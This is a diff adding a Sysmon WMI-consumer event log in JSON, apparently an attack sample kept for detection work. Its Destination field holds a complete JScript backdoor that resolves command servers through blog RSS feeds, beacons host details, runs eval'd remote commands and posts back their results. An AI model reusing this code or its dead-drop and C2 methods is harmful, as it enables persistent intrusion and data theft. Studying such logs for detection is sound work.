@@ -1,0 +1,51 @@
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "System": {
+      "Provider": {
+        "#attributes": {
+          "Name": "Microsoft-Windows-Sysmon",
+          "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+        }
+      },
+      "EventID": 20,
+      "Version": 3,
+      "Level": 4,
+      "Task": 20,
+      "Opcode": 0,
+      "Keywords": "0x8000000000000000",
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2019-04-03T18:11:54.178467Z"
+        }
+      },
+      "EventRecordID": 7195,
+      "Correlation": null,
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 1828,
+          "ThreadID": 3164
+        }
+      },
+      "Channel": "Microsoft-Windows-Sysmon/Operational",
+      "Computer": "PC04.example.corp",
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-18"
+        }
+      }
+    },
+    "EventData": {
+      "RuleName": "",
+      "EventType": "WmiConsumerEvent",
+      "UtcTime": "2019-04-03 18:11:54.178",
+      "Operation": "Modified",
+      "User": "PC04\\IEUser",
+      "Name": "\"ProbeScriptFint\"",
+      "Type": "Script",
+      "Destination": "\"var sXmlUrl=\\\"http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss\\\";var sOwner='XDD';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\\\\\"%PCI%\\\\\\\" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version+'&runtime='+$.runtime;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\\\\\"scrcons.exe\\\\\\\"'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');var re=/<title>@(.*)@<\\\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\\\s*)|(\\\\s*$)/g,'');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i<commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\\\\''+commands[i].id+'\\\\':\\\\''+escape(result)+'\\\\'';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();\""
+    }
+  }
+}
